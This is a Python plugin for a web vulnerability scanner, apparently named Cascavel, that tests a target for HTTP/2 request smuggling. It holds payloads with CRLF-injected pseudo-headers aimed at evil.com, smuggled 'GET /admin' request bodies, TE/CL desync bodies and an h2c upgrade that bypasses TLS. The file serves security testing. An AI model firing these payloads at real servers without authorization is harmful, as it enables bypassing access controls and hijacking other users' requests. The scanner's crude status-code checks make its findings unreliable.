# plugins/http2_smuggle.py — Cascavel 2026 Intelligence
import warnings

import requests

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

H2_PATHS = ["/", "/api/", "/admin/", "/login", "/api/v1/", "/graphql"]

# ──────────── H2 HEADER ATTACKS ────────────
H2_HEADER_ATTACKS = {
    "PSEUDO_HEADER_INJECTION": {":method": "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin"},
    "HEADER_NAME_CRLF": {"X-Test\r\nHost: evil.com": "inject"},
    "TRANSFER_ENCODING_H2": {"transfer-encoding": "chunked"},
    "CONNECTION_HEADER_H2": {"connection": "keep-alive"},
    "CONTENT_LENGTH_MISMATCH": {"content-length": "0"},
    # 2026 additions
    "TE_CHUNKED_H2": {"transfer-encoding": "chunked"},
    "UPGRADE_HEADER": {"upgrade": "h2c"},
    "HOST_OVERRIDE": {"host": "internal.service"},
    "AUTHORITY_OVERRIDE": {":authority": "evil.com"},
    "METHOD_OVERRIDE": {"X-HTTP-Method-Override": "DELETE"},
}

# ──────────── H2.CL DESYNC ────────────
H2CL_TESTS = [
    {"method": "POST", "headers": {"Content-Length": "0", "Transfer-Encoding": "chunked"}, "body": ""},
    {"method": "POST", "headers": {"Content-Length": "5"}, "body": "0\r\n\r\n"},
    {"method": "POST", "headers": {"Content-Length": "0"}, "body": "GET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"},
]

# ──────────── H2.TE DESYNC ────────────
H2TE_TESTS = [
    {"method": "POST", "headers": {"Transfer-Encoding": "chunked"}, "body": "0\r\n\r\nSMUGGLED"},
    {"method": "POST", "headers": {"Transfer-Encoding": "chunked, identity"}, "body": "0\r\n\r\n"},
]


def _test_h2_headers(target, path):
    """Testa injeção de headers HTTP/2 proibidos."""
    vulns = []
    for attack_name, headers in H2_HEADER_ATTACKS.items():
        for scheme in ["https", "http"]:
            url = f"{scheme}://{target}{path}"
            try:
                resp = requests.get(url, headers=headers, timeout=8, verify=False)
                if resp.status_code in (200, 301, 302):
                    vulns.append(
                        {
                            "tipo": f"H2_{attack_name}",
                            "path": path,
                            "severidade": "ALTO",
                            "status": resp.status_code,
                            "descricao": f"HTTP/2 header {attack_name} não bloqueado!",
                        }
                    )
                    break
                elif resp.status_code == 400:
                    # Server rejected — good security posture
                    pass
            except Exception:
                continue
    return vulns


def _test_h2_desync(target, path, tests, test_type):
    """Testa HTTP/2 desynchronization."""
    vulns = []
    for test in tests:
        for scheme in ["https", "http"]:
            url = f"{scheme}://{target}{path}"
            try:
                resp = requests.request(
                    test["method"],
                    url,
                    headers=test["headers"],
                    data=test.get("body", ""),
                    timeout=8,
                    verify=False,
                )
                if resp.status_code == 400:
                    vulns.append(
                        {
                            "tipo": f"H2_DESYNC_{test_type}",
                            "path": path,
                            "severidade": "ALTO",
                            "status": resp.status_code,
                            "descricao": f"HTTP/2 {test_type} desync — backend processou diferente!",
                        }
                    )
                elif resp.status_code == 500:
                    vulns.append(
                        {
                            "tipo": f"H2_DESYNC_{test_type}_ERROR",
                            "path": path,
                            "severidade": "CRITICO",
                            "status": resp.status_code,
                            "descricao": f"HTTP/2 {test_type} causou 500 — desync confirmado!",
                        }
                    )
                break
            except Exception:
                continue
    return vulns


def _test_h2c_upgrade(target):
    """Testa se h2c cleartext upgrade é aceito (bypass de TLS-only restrictions)."""
    vulns = []
    try:
        resp = requests.get(
            f"http://{target}/",
            headers={
                "Upgrade": "h2c",
                "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
                "Connection": "Upgrade, HTTP2-Settings",
            },
            timeout=8,
        )
        if resp.status_code == 101:
            vulns.append(
                {
                    "tipo": "H2C_UPGRADE_ACCEPTED",
                    "severidade": "CRITICO",
                    "descricao": "h2c cleartext upgrade aceito — bypass de TLS restrictions!",
                }
            )
        elif "upgrade" in resp.headers.get("Connection", "").lower():
            vulns.append(
                {
                    "tipo": "H2C_UPGRADE_POSSIBLE",
                    "severidade": "ALTO",
                    "descricao": "Servidor indica suporte a h2c upgrade!",
                }
            )
    except Exception:
        pass
    return vulns


def _test_websocket_h2(target):
    """Testa WebSocket over HTTP/2 (RFC 8441)."""
    try:
        resp = requests.get(
            f"https://{target}/",
            headers={
                ":protocol": "websocket",
                "Sec-WebSocket-Version": "13",
            },
            timeout=5,
            verify=False,
        )
        if resp.status_code == 200:
            return {
                "tipo": "H2_WEBSOCKET_EXTENDED_CONNECT",
                "severidade": "MEDIO",
                "descricao": "Extended CONNECT para WebSocket over HTTP/2 detectado",
            }
    except Exception:
        pass
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner HTTP/2 Smuggling 2026-Grade — H2.CL, H2.TE, h2c, Desync.

    Técnicas: 10 header attacks (pseudo-header/CRLF/TE/connection/host/authority/
    method override), 3 H2.CL desync tests, 2 H2.TE desync tests,
    h2c cleartext upgrade detection, WebSocket over H2 detection,
    multi-scheme testing (HTTP + HTTPS).
    Research: James Kettle HTTP/2 Desync, RFC 8441.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for path in H2_PATHS:
        vulns.extend(_test_h2_headers(target, path))
        vulns.extend(_test_h2_desync(target, path, H2CL_TESTS, "H2CL"))
        vulns.extend(_test_h2_desync(target, path, H2TE_TESTS, "H2TE"))

    # h2c upgrade
    vulns.extend(_test_h2c_upgrade(target))

    # WebSocket over H2
    ws = _test_websocket_h2(target)
    if ws:
        vulns.append(ws)

    return {
        "plugin": "http2_smuggle",
        "versao": "2026.1",
        "tecnicas": [
            "h2_header_injection",
            "h2cl_desync",
            "h2te_desync",
            "h2c_upgrade",
            "websocket_h2",
            "authority_override",
        ],
        "resultados": vulns if vulns else "Nenhum HTTP/2 smuggling detectado",
    }
